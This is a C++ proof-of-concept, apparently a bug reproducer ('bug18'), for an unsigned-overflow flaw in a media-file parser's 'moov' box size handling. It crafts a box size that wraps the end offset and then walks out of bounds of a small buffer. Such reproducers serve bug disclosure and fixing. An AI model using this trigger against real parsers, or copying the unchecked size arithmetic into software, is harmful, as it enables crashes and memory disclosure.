// bug18 — moov_box_start + get_box_size() unsigned overflow.
// Same primitive as bug17, exercised at file_layout.cc:224 (moov path).

#include <cstdio>
#include <cstdint>
#include <memory>
#include <vector>

#include "bitstream.h"

int main() {
  std::vector<uint8_t> real_buf(64, 0xEF);
  uint64_t fake_length = static_cast<uint64_t>(1) << 30;
  auto reader = std::make_shared<StreamReader_memory>(real_buf.data(),
                                                      (size_t)fake_length, false);

  uint64_t moov_box_start = 28;
  uint64_t crafted_box_size = static_cast<uint64_t>(-1) - 23;     // wraps to 4
  uint64_t end_of_moov_box = moov_box_start + crafted_box_size;
  std::fprintf(stderr,
               "[bug18] moov_box_start=%llu  crafted_box_size=0x%016llx  "
               "end_of_moov_box (wrapped)=%llu\n",
               (unsigned long long)moov_box_start,
               (unsigned long long)crafted_box_size,
               (unsigned long long)end_of_moov_box);

  BitstreamRange r(reader, (size_t)moov_box_start, (size_t)end_of_moov_box);
  uint8_t sink = 0;
  for (int i = 0; i < 256; ++i) sink ^= r.read8();
  std::fprintf(stderr, "[bug18] survived OOB walk, sink=0x%02x\n", sink);
  return 0;
}
